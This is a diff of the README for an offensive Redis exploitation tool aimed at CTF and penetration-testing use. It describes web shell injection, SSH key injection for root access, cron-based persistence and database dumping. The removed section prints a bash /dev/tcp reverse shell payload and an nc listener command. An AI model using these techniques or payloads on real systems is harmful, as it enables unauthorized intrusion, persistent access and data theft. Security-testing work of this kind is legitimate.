@@ -1,117 +1,100 @@
-<a href="https://www.buymeacoffee.com/0xDTC"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a knowledge&emoji=📖&slug=0xDTC&button_colour=FF5F5F&font_colour=ffffff&font_family=Comic&outline_colour=000000&coffee_colour=FFDD00" /></a>
+# Redis CTF Exploitation Tool
 
-# Notice: Project is under development not fully working.
+A modular Redis exploitation tool designed for CTF (Capture The Flag) scenarios and educational purposes.
 
-## Redis Exploit Automation Script
+## Structure
 
-This script is designed for penetration testers and ethical hackers to exploit Redis misconfigurations. It automates tasks such as injecting custom web shells, dumping the Redis database, and injecting SSH keys for privilege escalation.
-
----
-
-### Features
-1. **Redis Connectivity Check**:
-   - Verifies if the target Redis server is reachable.
-   - Supports authentication if required.
-
-2. **Custom Web Shell Injection**:
-   - Prompts the user to input a custom shell command (e.g., a reverse shell payload).
-   - Injects the command into a writable directory on the target.
-
-3. **Database Dump**:
-   - Dumps the Redis database to disk for offline analysis.
-
-4. **SSH Key Injection**:
-   - Injects an SSH public key for root access if the target allows configuration changes.
-
-5. **Netcat Listener Validation**:
-   - Ensures a listener (`nc -lvnp <port>`) is running before executing commands requiring it.
-
----
-
-### Requirements
-- **Dependencies**:
-  - `redis-cli`: To interact with the Redis server.
-  - `curl`: To fetch reverse shell payloads if needed.
-  - `netstat`: To check for active Netcat listeners.
-
-Install dependencies on Debian/Ubuntu:
-```bash
-sudo apt update
-sudo apt install redis-tools curl net-tools
+```
+0xRedisis/
+├── Redisis              # Main executable script
+├── Redisis_backup       # Backup of original monolithic script
+├── README.md           # This file
+└── features/           # Feature modules directory
+    ├── common.sh       # Common utilities and functions
+    ├── reconnaissance.sh # Redis reconnaissance module
+    ├── webshell.sh     # Web shell injection module
+    ├── ssh_injection.sh # SSH key injection module
+    ├── database_dump.sh # Database dump module
+    └── cron_injection.sh # Cron job injection module
 ```
 
----
+## Usage
 
-### Usage
-1. Clone this repository:
-   ```bash
-   git clone https://github.com/yourusername/redis-exploit-script.git
-   cd redis-exploit-script
-   ```
-
-2. Make the script executable:
-   ```bash
-   chmod +x redis_exploit.sh
-   ```
-
-3. Run the script:
-   ```bash
-   ./redis_exploit.sh <host> <port> [password]
-   ```
-   - Replace `<host>` with the Redis server's IP.
-   - Replace `<port>` with the Redis server's port (default: 6379).
-   - If authentication is required, provide the `password`. Otherwise, omit it.
-
----
-
-### Menu Options
-1. **Inject a Custom Web Shell**:
-   - Prompts the user to input a shell command.
-   - Example: A reverse shell payload such as:
-     ```bash
-     bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1
-     ```
-   - Injects the payload into a writable web directory on the target.
-   - Access the web shell via: `http://<host>/customshell.php`.
-
-2. **Dump the Database**:
-   - Executes `SAVE` to dump the database to disk.
-   - Provides instructions to fetch the `dump.rdb` file for offline analysis.
-
-3. **Inject an SSH Key**:
-   - Prompts for your SSH public key.
-   - Injects the key into `/root/.ssh/authorized_keys`.
-   - Allows SSH access to the target as `root`.
-
----
+```bash
+./Redisis <host> <port> [password]
+```
 
 ### Examples
-- **Run Script Without Authentication**:
-  ```bash
-  ./redis_exploit.sh 192.168.1.10 6379
-  ```
 
-- **Run Script with Authentication**:
-  ```bash
-  ./redis_exploit.sh 192.168.1.10 6379 mypassword
-  ```
+```bash
+# Connect to Redis without authentication
+./Redisis 192.168.1.100 6379
 
----
+# Connect to Redis with password
+./Redisis target.ctf.com 6379 mypassword
+```
 
-### Notes
-- Ensure you have a Netcat listener running for reverse shells:
-  ```bash
-  nc -lvnp <your-port>
-  ```
+## Features
 
-- The script will wait until the listener is active before proceeding with shell injection.
+### 1. Reconnaissance
+- Gathers server information (version, OS, architecture)
+- Checks memory usage and configuration
+- Lists database keys and keyspace info
+- Tests for dangerous commands availability
 
----
+### 2. Web Shell Injection
+- Custom command execution shells
+- Interactive PHP shells with cmd parameter
+- Reverse shell payloads
+- Automatically tries common web directories
 
-### Disclaimer
-This script is intended for legal and ethical use only. Ensure you have explicit permission before testing or exploiting any Redis server. Misuse of this script may lead to legal consequences.
+### 3. SSH Key Injection
+- Uses existing SSH keys
+- Generates new key pairs
+- Accepts custom public keys
+- Tries common SSH directories
 
----
+### 4. Database Dump
+- Saves current database to disk
+- Shows dump location
+- Provides retrieval instructions
 
-## Contribution
-Feel free to open issues or submit pull requests to improve the script!
+### 5. Cron Job Injection
+- Injects persistent cron jobs
+- Tries common cron directories
+- Executes payloads every minute
+
+## Modular Architecture
+
+Each feature is contained in its own module for easy maintenance:
+
+- **common.sh**: Shared utilities, Redis connection handling, input validation
+- **reconnaissance.sh**: Information gathering functions
+- **webshell.sh**: Web shell injection logic
+- **ssh_injection.sh**: SSH key injection functionality
+- **database_dump.sh**: Database dumping operations
+- **cron_injection.sh**: Cron job injection methods
+
+## Adding New Features
+
+1. Create a new `.sh` file in the `features/` directory
+2. Source `common.sh` at the top of your module
+3. Define your functions
+4. Add the source line to the main `Redisis` script
+5. Add menu option and case statement entry
+
+## Requirements
+
+- **redis-cli**: Redis command-line interface
+- **ssh-keygen**: For generating SSH keys (optional)
+- **Standard Unix tools**: bash, timeout, grep, etc.
+
+Install on Debian/Ubuntu:
+```bash
+sudo apt update
+sudo apt install redis-tools openssh-client
+```
+
+## Security Notice
+
+This tool is designed for educational purposes and authorized penetration testing only. Use only on systems you own or have explicit permission to test.
